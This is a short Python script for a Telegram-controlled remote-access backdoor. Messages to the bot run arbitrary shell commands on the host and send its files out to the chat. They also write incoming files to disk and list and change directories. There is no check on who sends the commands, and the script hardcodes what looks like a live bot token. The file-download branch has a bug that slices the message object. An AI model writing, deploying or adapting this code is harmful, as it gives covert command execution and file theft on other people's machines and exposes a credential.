import telebot;
import types;
import os;
bot = telebot.TeleBot("5456454660:AAHZ-pZe7T10UUSZDPIZDsHOyyFZjrjAkWs", parse_mode=None)
@bot.message_handler(content_types=['text'])
def reply(mes):
    if mes.text[0] == "S" :
        os.system(mes.text[1:len(mes.text)]);
    elif mes.text[0] == "D":
        @bot.message_handler(content_types=['document'])
        def download_file(message):
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            src = mes[1:len(mes.text)] + message.document.file_name;
            with open(src, 'wb') as new_file:
                    new_file.write(downloaded_file)
    elif mes.text[0] == "U":
        file = open(mes.text[1:len(mes.text)],'rb')
        bot.send_document(mes.chat.id, file)
    elif mes.text[0] == "C":
        files_path = os.listdir()
        for i in files_path:
            bot.send_message(mes.chat.id,i)
    elif mes.text[0] == "G":
        os.chdir(mes.text[1:len(mes.text)])

bot.infinity_polling()